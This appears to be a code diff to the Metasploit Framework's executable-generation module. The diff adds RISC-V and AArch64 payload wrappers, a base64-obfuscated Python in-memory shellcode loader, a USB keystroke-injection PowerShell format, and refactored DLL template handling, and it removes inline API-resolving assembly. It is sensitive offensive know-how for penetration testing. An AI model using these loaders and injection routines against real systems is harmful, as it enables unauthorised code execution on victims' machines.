@@ -18,10 +18,7 @@ require 'rex/zip'
 require 'rex/powershell'
 require 'metasm'
 require 'digest/sha1'
-require 'msf/core/exe/segment_injector'
-require 'msf/core/exe/segment_appender'
-
-  # Generates a default template
+# Generates a default template
   #
   # @param  opts [Hash] The options hash
   # @option opts [String] :template, the template type for the executable
@@ -170,6 +167,10 @@ require 'msf/core/exe/segment_appender'
         return to_linux_aarch64_elf(framework, code)
       end
 
+      if plat.index(Msf::Module::Platform::OSX)
+        return to_osx_aarch64_macho(framework, code)
+      end
+
       # XXX: Add remaining AARCH64 systems here
     end
 
@@ -193,6 +194,21 @@ require 'msf/core/exe/segment_appender'
       end
       # XXX: Add remaining MIPSLE systems here
     end
+
+    if arch.index(ARCH_RISCV32LE)
+      if plat.index(Msf::Module::Platform::Linux)
+        return to_linux_riscv32le_elf(framework, code)
+      end
+      # TODO: Add remaining RISCV32LE systems here
+    end
+
+    if arch.index(ARCH_RISCV64LE)
+      if plat.index(Msf::Module::Platform::Linux)
+        return to_linux_riscv64le_elf(framework, code)
+      end
+      # TODO: Add remaining RISCV64LE systems here
+    end
+
     nil
   end
 
@@ -225,7 +241,7 @@ require 'msf/core/exe/segment_appender'
   # @return           [String]
   def self.to_win32pe(framework, code, opts = {})
 
-    # For backward compatability, this is roughly equivalent to 'exe-small' fmt
+    # For backward compatibility, this is roughly equivalent to 'exe-small' fmt
     if opts[:sub_method]
       if opts[:inject]
         raise RuntimeError, 'NOTE: using the substitution method means no inject support'
@@ -309,8 +325,8 @@ require 'msf/core/exe/segment_appender'
     block = blocks.first
 
     # TODO: Allow the entry point in a different block
-    if payload.length + 256 > block[1]
-      raise RuntimeError, "The largest block in .text does not have enough contiguous space (need:#{payload.length+256} found:#{block[1]})"
+    if payload.length + 256 >= block[1]
+      raise RuntimeError, "The largest block in .text does not have enough contiguous space (need:#{payload.length+257} found:#{block[1]})"
     end
 
     # Make a copy of the entire .text section
@@ -331,8 +347,8 @@ require 'msf/core/exe/segment_appender'
       poff += 256
       eidx = rand(poff-(entry.length + 5))
     else          # place the entry pointer after the payload
-      poff -= 256
-      eidx = rand(block[1] - (poff + payload.length)) + poff + payload.length
+      poff -= [256, poff].min
+      eidx = rand(block[1] - (poff + payload.length + 256)) + poff + payload.length
     end
 
     # Relative jump from the end of the nops to the payload
@@ -419,7 +435,7 @@ require 'msf/core/exe/segment_appender'
       if (virtualAddress...virtualAddress+sizeOfRawData).include?(addressOfEntryPoint)
         importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('V')[0]
         if (importsTable - addressOfEntryPoint) < code.length
-          #shift original entry point to prevent tables overwritting
+          #shift original entry point to prevent tables overwriting
           addressOfEntryPoint = importsTable - code.length + 4
 
           entry_point_offset = pe._dos_header.v['e_lfanew'] + entryPoint_offset
@@ -533,7 +549,7 @@ require 'msf/core/exe/segment_appender'
 
     case opts[:exe_type]
     when :service_exe
-      max_length = 8192
+      opts[:exe_max_sub_length] ||= 8192
       name = opts[:servicename]
       if name
         bo = pe.index('SERVICENAME')
@@ -544,23 +560,27 @@ require 'msf/core/exe/segment_appender'
       end
       pe[136, 4] = [rand(0x100000000)].pack('V') unless opts[:sub_method]
     when :dll
-      max_length = 2048
+      opts[:exe_max_sub_length] ||= 4096
     when :exe_sub
-      max_length = 4096
+      opts[:exe_max_sub_length] ||= 4096
     end
 
     bo = self.find_payload_tag(pe, "Invalid PE EXE subst template: missing \"PAYLOAD:\" tag")
 
-    if code.length <= max_length
+    if code.length <= opts.fetch(:exe_max_sub_length)
       pe[bo, code.length] = [code].pack("a*")
     else
       raise RuntimeError, "The EXE generator now has a max size of " +
-                          "#{max_length} bytes, please fix the calling module"
+                          "#{opts[:exe_max_sub_length]} bytes, please fix the calling module"
     end
 
     if opts[:exe_type] == :dll
       mt = pe.index('MUTEX!!!')
       pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
+      %w{ Local\Semaphore:Default Local\Event:Default }.each do |name|
+        offset = pe.index(name)
+        pe[offset,26] = "Local\\#{Rex::Text.rand_text_alphanumeric(20)}" if offset
+      end
 
       if opts[:dll_exitprocess]
         exit_thread = "\x45\x78\x69\x74\x54\x68\x72\x65\x61\x64\x00"
@@ -629,7 +649,7 @@ require 'msf/core/exe/segment_appender'
   # @option opts        [Boolean] :sub_method use substitution technique with a
   #                                service template PE
   # @option opts        [String] :servicename name of the service, not used in
-  #                               substituion technique
+  #                               substitution technique
   #
   # @return [String] Windows Service PE file
   def self.to_win32pe_service(framework, code, opts = {})
@@ -647,7 +667,6 @@ require 'msf/core/exe/segment_appender'
 
       # XXX This should not be required, it appears there is a dependency inversion
       # See https://github.com/rapid7/metasploit-framework/pull/9851
-      require 'msf/core/payload_generator'
       venom_generator = Msf::PayloadGenerator.new(opts)
       code_service = venom_generator.multiple_encode_payload(code)
       return to_winpe_only(framework, code_service, opts)
@@ -671,6 +690,40 @@ require 'msf/core/exe/segment_appender'
     exe_sub_method(code,opts)
   end
 
+  # self.set_template_default_winpe_dll
+  #
+  # Set the default winpe DLL template. It will select the template based on the parameters provided including the size
+  # architecture and an optional flavor. See data/templates/src/pe for template source code and build tools.
+  #
+  # @param opts [Hash]
+  # @param arch The architecture, as one the predefined constants.
+  # @param size [Integer] The size of the payload.
+  # @param flavor [Nil,String] An optional DLL flavor, one of 'mixed_mode' or 'dccw_gdiplus'
+  private_class_method def self.set_template_default_winpe_dll(opts, arch, size, flavor: nil)
+    return if opts[:template].present?
+
+    # dynamic size upgrading is only available when MSF selects the template because there's currently no way to
+    # determine the amount of space that is available in the template provided by the user so it's assumed to be 4KiB
+    match = {4096 => '', 262144 => '.256kib'}.find { |k,v| size <= k }
+    if match
+      opts[:exe_max_sub_length] = match.first
+      size_suffix = match.last
+    end
+
+    arch = {ARCH_X86 => 'x86', ARCH_X64 => 'x64'}.fetch(arch, nil)
+    raise ArgumentError, 'The specified arch is not supported, no DLL templates are available for it.' if arch.nil?
+
+    if flavor.present?
+      unless %w[mixed_mode dccw_gdiplus].include?(flavor)
+        raise ArgumentError, 'The specified flavor is not supported, no DLL templates are available for it.'
+      end
+
+      flavor = '_' + flavor
+    end
+
+    set_template_default(opts, "template_#{arch}_windows#{flavor}#{size_suffix}.dll")
+  end
+
   # self.to_win32pe_dll
   #
   # @param framework  [Msf::Framework]  The framework of you want to use
@@ -681,8 +734,8 @@ require 'msf/core/exe/segment_appender'
   # @option           [String] :inject
   # @return           [String]
   def self.to_win32pe_dll(framework, code, opts = {})
-    # Allow the user to specify their own DLL template
-    set_template_default(opts, "template_x86_windows.dll")
+    flavor = opts.fetch(:mixed_mode, false) ? 'mixed_mode' : nil
+    set_template_default_winpe_dll(opts, ARCH_X86, code.size, flavor: flavor)
     opts[:exe_type] = :dll
 
     if opts[:inject]
@@ -702,8 +755,9 @@ require 'msf/core/exe/segment_appender'
   # @option           [String] :inject
   # @return           [String]
   def self.to_win64pe_dll(framework, code, opts = {})
-    # Allow the user to specify their own DLL template
-    set_template_default(opts, "template_x64_windows.dll")
+    flavor = opts.fetch(:mixed_mode, false) ? 'mixed_mode' : nil
+    set_template_default_winpe_dll(opts, ARCH_X64, code.size, flavor: flavor)
+
     opts[:exe_type] = :dll
 
     if opts[:inject]
@@ -714,7 +768,7 @@ require 'msf/core/exe/segment_appender'
   end
 
 
-  # self.to_win32pe_dll
+  # self.to_win32pe_dccw_gdiplus_dll
   #
   # @param framework  [Msf::Framework]  The framework of you want to use
   # @param code       [String]
@@ -724,18 +778,11 @@ require 'msf/core/exe/segment_appender'
   # @option           [String] :inject
   # @return           [String]
   def self.to_win32pe_dccw_gdiplus_dll(framework, code, opts = {})
-    # Allow the user to specify their own DLL template
-    set_template_default(opts, "template_x86_windows_dccw_gdiplus.dll")
-    opts[:exe_type] = :dll
-
-    if opts[:inject]
-      self.to_win32pe(framework, code, opts)
-    else
-      exe_sub_method(code,opts)
-    end
+    set_template_default_winpe_dll(opts, ARCH_X86, code.size, flavor: 'dccw_gdiplus')
+    to_win32pe_dll(framework, code, opts)
   end
 
-  # self.to_win64pe_dll
+  # self.to_win64pe_dccw_gdiplus_dll
   #
   # @param framework  [Msf::Framework]  The framework of you want to use
   # @param code       [String]
@@ -745,15 +792,8 @@ require 'msf/core/exe/segment_appender'
   # @option           [String] :inject
   # @return           [String]
   def self.to_win64pe_dccw_gdiplus_dll(framework, code, opts = {})
-    # Allow the user to specify their own DLL template
-    set_template_default(opts, "template_x64_windows_dccw_gdiplus.dll")
-    opts[:exe_type] = :dll
-
-    if opts[:inject]
-      raise RuntimeError, 'Template injection unsupported for x64 DLLs'
-    else
-      exe_sub_method(code,opts)
-    end
+    set_template_default_winpe_dll(opts, ARCH_X64, code.size, flavor: 'dccw_gdiplus')
+    to_win64pe_dll(framework, code, opts)
   end
 
   # Wraps an executable inside a Windows .msi file for auto execution when run
@@ -843,6 +883,25 @@ require 'msf/core/exe/segment_appender'
     mo = self.get_file_contents(opts[:template])
     bo = self.find_payload_tag(mo, "Invalid OSX ArmLE Mach-O template: missing \"PAYLOAD:\" tag")
     mo[bo, code.length] = code
+    mo
+  end
+
+  # self.to_osx_aarch64_macho
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String]
+  def self.to_osx_aarch64_macho(framework, code, opts = {})
+
+    # Allow the user to specify their own template
+    set_template_default(opts, "template_aarch64_darwin.bin")
+
+    mo = self.get_file_contents(opts[:template])
+    bo = self.find_payload_tag(mo, "Invalid OSX Aarch64 Mach-O template: missing \"PAYLOAD:\" tag")
+    mo[bo, code.length] = code
+    Payload::MachO.new(mo).sign
     mo
   end
 
@@ -948,7 +1007,7 @@ require 'msf/core/exe/segment_appender'
     zip.add_file("#{app_name}/Contents/Resources/", '')
     zip.add_file("#{app_name}/Contents/MacOS/", '')
     # Add the macho and mark it as executable
-    zip.add_file("#{app_name}/Contents/MacOS/#{exe_name}", exe).last.attrs = 0x10
+    zip.add_file("#{app_name}/Contents/MacOS/#{exe_name}", exe).last.attrs = 0o777
     zip.add_file("#{app_name}/Contents/Info.plist", info_plist)
     zip.add_file("#{app_name}/Contents/PkgInfo", 'APPLaplt')
     zip.pack
@@ -1118,6 +1177,17 @@ require 'msf/core/exe/segment_appender'
     to_exe_elf(framework, opts, "template_x86_linux_dll.bin", code)
   end
 
+  # Create a AARCH64 Linux ELF_DYN containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
+  def self.to_linux_aarch64_elf_dll(framework, code, opts = {})
+    to_exe_elf(framework, opts, "template_aarch64_linux_dll.bin", code)
+  end
+
   # Create a 64-bit Linux ELF_DYN containing the payload provided in +code+
   #
   # @param framework [Msf::Framework]
@@ -1150,7 +1220,7 @@ require 'msf/core/exe/segment_appender'
   def self.to_linux_armle_elf_dll(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_armle_linux_dll.bin", code)
   end
-  
+
   # self.to_linux_aarch64_elf
   #
   # @param framework [Msf::Framework]
@@ -1182,6 +1252,50 @@ require 'msf/core/exe/segment_appender'
   # @return           [String] Returns an elf
   def self.to_linux_mipsbe_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_mipsbe_linux.bin", code, true)
+  end
+
+  # Create a RISC-V 64-bit LE Linux ELF containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
+  def self.to_linux_riscv64le_elf(framework, code, opts = {})
+    to_exe_elf(framework, opts, "template_riscv64le_linux.bin", code)
+  end
+
+  # Create a RISC-V 64-bit LE Linux ELF_DYN containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
+  def self.to_linux_riscv64le_elf_dll(framework, code, opts = {})
+    to_exe_elf(framework, opts, "template_riscv64le_linux_dll.bin", code)
+  end
+
+  # Create a RISC-V 32-bit LE Linux ELF containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
+  def self.to_linux_riscv32le_elf(framework, code, opts = {})
+    to_exe_elf(framework, opts, "template_riscv32le_linux.bin", code)
+  end
+
+  # Create a RISC-V 32-bit LE Linux ELF_DYN containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
+  def self.to_linux_riscv32le_elf_dll(framework, code, opts = {})
+    to_exe_elf(framework, opts, "template_riscv32le_linux_dll.bin", code)
   end
 
   # self.to_exe_vba
@@ -1416,6 +1530,18 @@ require 'msf/core/exe/segment_appender'
                     method: 'reflection')
   end
 
+  def self.to_powershell_ducky_script(framework, arch, code)
+    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
+    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                    arch,
+                    template_path,
+                    encode_final_payload: true,
+                    method: 'reflection')
+    replacers = {}
+    replacers[:var_payload] = powershell
+    read_replace_script_template("to_powershell.ducky_script.template", replacers)
+  end
+
   def self.to_powershell_hta(framework, arch, code)
     template_path = Rex::Powershell::Templates::TEMPLATE_DIR
 
@@ -1435,6 +1561,45 @@ require 'msf/core/exe/segment_appender'
     hash_sub[:powershell] = powershell
 
     read_replace_script_template("to_powershell.hta.template", hash_sub)
+  end
+
+  def self.to_python_reflection(framework, arch, code, exeopts)
+    unless [ ARCH_X86, ARCH_X64, ARCH_AARCH64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_PPC ].include? arch
+      raise RuntimeError, "Msf::Util::EXE.to_python_reflection is not compatible with #{arch}"
+    end
+    python_code = <<~PYTHON
+      #{Rex::Text.to_python(code)}
+      import ctypes,os
+      if os.name == 'nt':
+       cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
+       ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+       ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
+       ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
+       ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)))
+       ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+      else:
+       import mmap
+       from ctypes.util import find_library
+       c = ctypes.CDLL(find_library('c'))
+       c.mmap.restype = ctypes.c_void_p
+       ptr = c.mmap(0,len(buf),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
+       ctypes.memmove(ptr,buf,len(buf))
+       c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
+       c.mprotect(ptr,len(buf),mmap.PROT_READ|mmap.PROT_EXEC)
+       ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+    PYTHON
+
+    "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(python_code)}')[0]))"
+  end
+
+  def self.to_win32pe_psh_msil(framework, code, opts = {})
+    Rex::Powershell::Payload.to_win32pe_psh_msil(Rex::Powershell::Templates::TEMPLATE_DIR, code)
+  end
+
+  def self.to_win32pe_psh_rc4(framework, code, opts = {})
+    # unlike other to_win32pe_psh_* methods, this expects powershell code, not asm
+    # this method should be called after other to_win32pe_psh_* methods to wrap the output
+    Rex::Powershell::Payload.to_win32pe_psh_rc4(Rex::Powershell::Templates::TEMPLATE_DIR, code)
   end
 
   def self.to_jsp(exe)
@@ -1493,7 +1658,14 @@ require 'msf/core/exe/segment_appender'
     paths = [
       [ "metasploit", "Payload.class" ],
     ]
-    zip.add_files(paths, MetasploitPayloads.path('java'))
+
+    zip.add_file('metasploit/', '')
+    paths.each do |path_parts|
+      path = ['java', path_parts].flatten.join('/')
+      contents = ::MetasploitPayloads.read(path)
+      zip.add_file(path_parts.join('/'), contents)
+    end
+
     zip.build_manifest :main_class => "metasploit.Payload"
     config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
     zip.add_file("metasploit.dat", config)
@@ -1521,7 +1693,7 @@ require 'msf/core/exe/segment_appender'
   #   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
   #   random.
   # @option opts :extra_files [Array<String,String>] Additional files to add
-  #   to the archive. First elment is filename, second is data
+  #   to the archive. First element is filename, second is data
   #
   # @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
   #
@@ -1651,103 +1823,11 @@ require 'msf/core/exe/segment_appender'
   # target code there, setting an exception handler that calls ExitProcess
   # and finally executing the code.
   def self.win32_rwx_exec(code)
-    stub_block = %Q^
-    ; Input: The hash of the API to call and all its parameters must be pushed onto stack.
-    ; Output: The return value from the API call will be in EAX.
-    ; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
-    ; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
-    ; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
-    ; Note: This function is unable to call forwarded exports.
-
-    api_call:
-      pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
-      mov ebp, esp           ; Create a new stack frame
-      xor edx, edx           ; Zero EDX
-      mov edx, [fs:edx+48]   ; Get a pointer to the PEB
-      mov edx, [edx+12]      ; Get PEB->Ldr
-      mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
-    next_mod:                ;
-      mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
-      movzx ecx, word [edx+38] ; Set ECX to the length we want to check
-      xor edi, edi           ; Clear EDI which will store the hash of the module name
-    loop_modname:            ;
-      xor eax, eax           ; Clear EAX
-      lodsb                  ; Read in the next byte of the name
-      cmp al, 'a'            ; Some versions of Windows use lower case module names
-      jl not_lowercase       ;
-      sub al, 0x20           ; If so normalise to uppercase
-    not_lowercase:           ;
-      ror edi, 13            ; Rotate right our hash value
-      add edi, eax           ; Add the next byte of the name
-      ;loop loop_modname      ; Loop until we have read enough
-      ; The random jmps added below will occasionally make this offset
-      ; greater than will fit in a byte, so we have to use a regular jnz
-      ; instruction which can take a full 32-bits to accomodate the
-      ; bigger offset
-      dec ecx
-      jnz loop_modname        ; Loop until we have read enough
-      ; We now have the module hash computed
-      push edx               ; Save the current position in the module list for later
-      push edi               ; Save the current module hash for later
-      ; Proceed to iterate the export address table,
-      mov edx, [edx+16]      ; Get this modules base address
-      mov eax, [edx+60]      ; Get PE header
-      add eax, edx           ; Add the modules base address
-      mov eax, [eax+120]     ; Get export tables RVA
-      test eax, eax          ; Test if no export address table is present
-      jz get_next_mod1       ; If no EAT present, process the next module
-      add eax, edx           ; Add the modules base address
-      push eax               ; Save the current modules EAT
-      mov ecx, [eax+24]      ; Get the number of function names
-      mov ebx, [eax+32]      ; Get the rva of the function names
-      add ebx, edx           ; Add the modules base address
-      ; Computing the module hash + function hash
-    get_next_func:           ;
-      test ecx, ecx          ; Changed from jecxz to accomodate the larger offset produced by random jmps below
-      jz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
-      dec ecx                ; Decrement the function name counter
-      mov esi, [ebx+ecx*4]   ; Get rva of next module name
-      add esi, edx           ; Add the modules base address
-      xor edi, edi           ; Clear EDI which will store the hash of the function name
-      ; And compare it to the one we want
-    loop_funcname:           ;
-      xor eax, eax           ; Clear EAX
-      lodsb                  ; Read in the next byte of the ASCII function name
-      ror edi, 13            ; Rotate right our hash value
-      add edi, eax           ; Add the next byte of the name
-      cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
-      jne loop_funcname      ; If we have not reached the null terminator, continue
-      add edi, [ebp-8]       ; Add the current module hash to the function hash
-      cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
-      jnz get_next_func      ; Go compute the next function hash if we have not found it
-      ; If found, fix up stack, call the function and then value else compute the next one...
-      pop eax                ; Restore the current modules EAT
-      mov ebx, [eax+36]      ; Get the ordinal table rva
-      add ebx, edx           ; Add the modules base address
-      mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
-      mov ebx, [eax+28]      ; Get the function addresses table rva
-      add ebx, edx           ; Add the modules base address
-      mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
-      add eax, edx           ; Add the modules base address to get the functions actual VA
-      ; We now fix up the stack and perform the call to the desired function...
-    finish:
-      mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
-      pop ebx                ; Clear off the current modules hash
-      pop ebx                ; Clear off the current position in the module list
-      popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
-      pop ecx                ; Pop off the origional return address our caller will have pushed
-      pop edx                ; Pop off the hash value our caller will have pushed
-      push ecx               ; Push back the correct return value
-      jmp eax                ; Jump into the required function
-      ; We now automagically return to the correct caller...
-    get_next_mod:            ;
-      pop eax                ; Pop off the current (now the previous) modules EAT
-    get_next_mod1:           ;
-      pop edi                ; Pop off the current (now the previous) modules hash
-      pop edx                ; Restore our position in the module list
-      mov edx, [edx]         ; Get the next module
-      jmp next_mod           ; Process this module
-    ^
+    stub_block = Rex::Payloads::Shuffle.from_graphml_file(
+      File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x86.graphml'),
+      arch: ARCH_X86,
+      name: 'api_call'
+    )
 
     stub_exit = %Q^
     ; Input: EBP must be the address of 'api_call'.
@@ -1853,97 +1933,11 @@ require 'msf/core/exe/segment_appender'
   # code to execute. block_offset is the offset of the next code from
   # the start of this code
   def self.win32_rwx_exec_thread(code, block_offset, which_offset='start')
-
-    stub_block = %Q^
-    ; Input: The hash of the API to call and all its parameters must be pushed onto stack.
-    ; Output: The return value from the API call will be in EAX.
-    ; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
-    ; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
-    ; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
-    ; Note: This function is unable to call forwarded exports.
-
-    api_call:
-      pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
-      mov ebp, esp           ; Create a new stack frame
-      xor edx, edx           ; Zero EDX
-      mov edx, [fs:edx+48]   ; Get a pointer to the PEB
-      mov edx, [edx+12]      ; Get PEB->Ldr
-      mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
-    next_mod:                ;
-      mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
-      movzx ecx, word [edx+38] ; Set ECX to the length we want to check
-      xor edi, edi           ; Clear EDI which will store the hash of the module name
-    loop_modname:            ;
-      xor eax, eax           ; Clear EAX
-      lodsb                  ; Read in the next byte of the name
-      cmp al, 'a'            ; Some versions of Windows use lower case module names
-      jl not_lowercase       ;
-      sub al, 0x20           ; If so normalise to uppercase
-    not_lowercase:           ;
-      ror edi, 13            ; Rotate right our hash value
-      add edi, eax           ; Add the next byte of the name
-      loop loop_modname      ; Loop until we have read enough
-      ; We now have the module hash computed
-      push edx               ; Save the current position in the module list for later
-      push edi               ; Save the current module hash for later
-      ; Proceed to iterate the export address table,
-      mov edx, [edx+16]      ; Get this modules base address
-      mov eax, [edx+60]      ; Get PE header
-      add eax, edx           ; Add the modules base address
-      mov eax, [eax+120]     ; Get export tables RVA
-      test eax, eax          ; Test if no export address table is present
-      jz get_next_mod1       ; If no EAT present, process the next module
-      add eax, edx           ; Add the modules base address
-      push eax               ; Save the current modules EAT
-      mov ecx, [eax+24]      ; Get the number of function names
-      mov ebx, [eax+32]      ; Get the rva of the function names
-      add ebx, edx           ; Add the modules base address
-      ; Computing the module hash + function hash
-    get_next_func:           ;
-      jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
-      dec ecx                ; Decrement the function name counter
-      mov esi, [ebx+ecx*4]   ; Get rva of next module name
-      add esi, edx           ; Add the modules base address
-      xor edi, edi           ; Clear EDI which will store the hash of the function name
-      ; And compare it to the one we want
-    loop_funcname:           ;
-      xor eax, eax           ; Clear EAX
-      lodsb                  ; Read in the next byte of the ASCII function name
-      ror edi, 13            ; Rotate right our hash value
-      add edi, eax           ; Add the next byte of the name
-      cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
-      jne loop_funcname      ; If we have not reached the null terminator, continue
-      add edi, [ebp-8]       ; Add the current module hash to the function hash
-      cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
-      jnz get_next_func      ; Go compute the next function hash if we have not found it
-      ; If found, fix up stack, call the function and then value else compute the next one...
-      pop eax                ; Restore the current modules EAT
-      mov ebx, [eax+36]      ; Get the ordinal table rva
-      add ebx, edx           ; Add the modules base address
-      mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
-      mov ebx, [eax+28]      ; Get the function addresses table rva
-      add ebx, edx           ; Add the modules base address
-      mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
-      add eax, edx           ; Add the modules base address to get the functions actual VA
-      ; We now fix up the stack and perform the call to the desired function...
-    finish:
-      mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
-      pop ebx                ; Clear off the current modules hash
-      pop ebx                ; Clear off the current position in the module list
-      popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
-      pop ecx                ; Pop off the origional return address our caller will have pushed
-      pop edx                ; Pop off the hash value our caller will have pushed
-      push ecx               ; Push back the correct return value
-      jmp eax                ; Jump into the required function
-      ; We now automagically return to the correct caller...
-    get_next_mod:            ;
-      pop eax                ; Pop off the current (now the previous) modules EAT
-    get_next_mod1:           ;
-      pop edi                ; Pop off the current (now the previous) modules hash
-      pop edx                ; Restore our position in the module list
-      mov edx, [edx]         ; Get the next module
-      jmp next_mod           ; Process this module
-    ^
+    stub_block = Rex::Payloads::Shuffle.from_graphml_file(
+      File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x86.graphml'),
+      arch: ARCH_X86,
+      name: 'api_call'
+    )
 
     stub_exit = %Q^
     ; Input: EBP must be the address of 'api_call'.
@@ -2092,7 +2086,7 @@ require 'msf/core/exe/segment_appender'
   # @param code [String] The shellcode for the resulting executable to run
   # @param fmt [String] One of the executable formats as defined in
   #   {.to_executable_fmt_formats}
-  # @param exeopts [Hash] Passed directly to the approrpriate method for
+  # @param exeopts [Hash] Passed directly to the appropriate method for
   #   generating an executable for the given +arch+/+plat+ pair.
   # @return [String] An executable appropriate for the given
   #   architecture/platform pair.
@@ -2190,6 +2184,10 @@ require 'msf/core/exe/segment_appender'
           to_linux_mipsbe_elf(framework, code, exeopts)
         when ARCH_MIPSLE
           to_linux_mipsle_elf(framework, code, exeopts)
+        when ARCH_RISCV32LE
+          to_linux_riscv32le_elf(framework, code, exeopts)
+        when ARCH_RISCV64LE
+          to_linux_riscv64le_elf(framework, code, exeopts)
         end
       elsif plat && plat.index(Msf::Module::Platform::BSD)
         case arch
@@ -2216,6 +2214,12 @@ require 'msf/core/exe/segment_appender'
           to_linux_x64_elf_dll(framework, code, exeopts)
         when ARCH_ARMLE
           to_linux_armle_elf_dll(framework, code, exeopts)
+        when ARCH_AARCH64
+          to_linux_aarch64_elf_dll(framework, code, exeopts)
+        when ARCH_RISCV32LE
+          to_linux_riscv32le_elf_dll(framework, code, exeopts)
+        when ARCH_RISCV64LE
+          to_linux_riscv64le_elf_dll(framework, code, exeopts)
         end
       end
     when 'macho', 'osx-app'
@@ -2231,6 +2235,8 @@ require 'msf/core/exe/segment_appender'
           to_osx_arm_macho(framework, code, exeopts)
         when ARCH_PPC
           to_osx_ppc_macho(framework, code, exeopts)
+        when ARCH_AARCH64
+          to_osx_aarch64_macho(framework, code, exeopts)
         end
       end
       fmt == 'osx-app' ? Msf::Util::EXE.to_osx_app(macho) : macho
@@ -2269,6 +2275,10 @@ require 'msf/core/exe/segment_appender'
       Msf::Util::EXE.to_powershell_command(framework, arch, code)
     when 'hta-psh'
       Msf::Util::EXE.to_powershell_hta(framework, arch, code)
+    when 'python-reflection'
+      Msf::Util::EXE.to_python_reflection(framework, arch, code, exeopts)
+    when 'ducky-script-psh'
+      Msf::Util::EXE.to_powershell_ducky_script(framework, arch, code)
     end
   end
 
@@ -2282,6 +2292,7 @@ require 'msf/core/exe/segment_appender'
       "aspx-exe",
       "axis2",
       "dll",
+      "ducky-script-psh",
       "elf",
       "elf-so",
       "exe",
@@ -2300,34 +2311,13 @@ require 'msf/core/exe/segment_appender'
       "psh-cmd",
       "psh-net",
       "psh-reflection",
+      "python-reflection",
       "vba",
       "vba-exe",
       "vba-psh",
       "vbs",
       "war"
     ]
-  end
-
-  #
-  # EICAR Canary
-  # @return [Boolean] Should return true
-  def self.is_eicar_corrupted?
-    path = ::File.expand_path(::File.join(
-      ::File.dirname(__FILE__),"..", "..", "..", "data", "eicar.com")
-    )
-    return true unless ::File.exist?(path)
-    ret = false
-    if ::File.exist?(path)
-      begin
-        data = ::File.read(path)
-        unless Digest::SHA1.hexdigest(data) == "3395856ce81f2b7382dee72602f798b642f14140"
-          ret = true
-        end
-      rescue ::Exception
-        ret = true
-      end
-    end
-    ret
   end
 
   # self.get_file_contents
